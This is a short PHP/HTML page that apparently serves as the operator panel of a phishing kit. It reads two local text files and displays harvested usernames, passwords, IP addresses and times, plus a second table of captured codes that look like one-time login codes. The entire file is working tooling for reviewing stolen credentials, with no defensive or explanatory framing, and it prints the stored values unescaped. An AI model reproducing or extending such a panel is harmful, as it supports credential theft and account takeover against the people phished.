<!DOCTYPE html><html><head><style>.logpass{float:left;padding:3px;width:48.8%;border:1px solid black;}.codes{float:right;padding:3px;width:49.8%;border:1px solid black;}.username{float:left}.codes{float:right}TABLE { width: 49.9%; border-collapse: collapse; }TD { padding: 3px; }.even TD{background:#eee;}</style></head>
<body><table border="1px" class="username"><tr><td>log</td><td>password</td><td>ip</td><td>time</td></tr><?php
		$lines = file('./login/111.txt');
		$lines = array_reverse($lines);
		foreach ($lines as $line){
			$line = str_replace(PHP_EOL,'',$line);
			list($username,$password,$ip,$date) = explode(';',$line);
			list($date1,$time) = explode('?',$date);
			echo"<tr><td>$username</td><td>$password</td><td>$ip</td><td>$time</td></tr>";
		}
	?></table><table border="1px" class="codes"><tr><td>code</td><td>ip</td><td>time</td></tr><?php
		$lines1 = file('./login/222.txt');
		$lines1 = array_reverse($lines1);
		foreach ($lines1 as $line1){
			$line1 = str_replace(PHP_EOL,'',$line1);
			list($code,$ip1,$date1) = explode(';',$line1);
			list($date2,$time1) = explode('?',$date1);
			echo"<tr><td>$code</td><td>$ip1</td><td>$time1</td></tr>";
		}
	?></table></body></html>
<?php	

?>